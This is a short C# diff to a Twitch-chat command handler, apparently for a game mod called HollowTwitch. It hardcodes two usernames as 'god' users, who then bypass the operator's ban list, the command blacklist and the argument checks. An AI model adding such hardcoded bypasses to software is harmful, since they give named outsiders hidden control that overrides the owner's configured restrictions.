@@ -44,7 +44,9 @@ namespace HollowTwitch
         {
             string[] pieces = command.Split(Seperator);
 
-            if (config.BannedUsers.Contains(user, StringComparer.OrdinalIgnoreCase))
+            bool god = user.ToLower() == "5fiftysix6" || user.ToLower() == "sid0003";
+
+            if (!god && config.BannedUsers.Contains(user, StringComparer.OrdinalIgnoreCase))
                 return;
 
             IOrderedEnumerable<Command> found = Commands
@@ -53,10 +55,7 @@ namespace HollowTwitch
 
             foreach (Command c in found)
             {
-                // if (!c.Preconditions.All(x => x.Check()))
-                //     continue;
-
-                if (config.BlacklistedCommands.Contains(c.Name, StringComparer.OrdinalIgnoreCase))
+                if (!god && config.BlacklistedCommands.Contains(c.Name, StringComparer.OrdinalIgnoreCase))
                     continue;
 
                 bool allGood = true;
@@ -76,6 +75,8 @@ namespace HollowTwitch
                         );
                     }
                 }
+
+                allGood |= god;
 
                 if (!allGood)
                     continue;
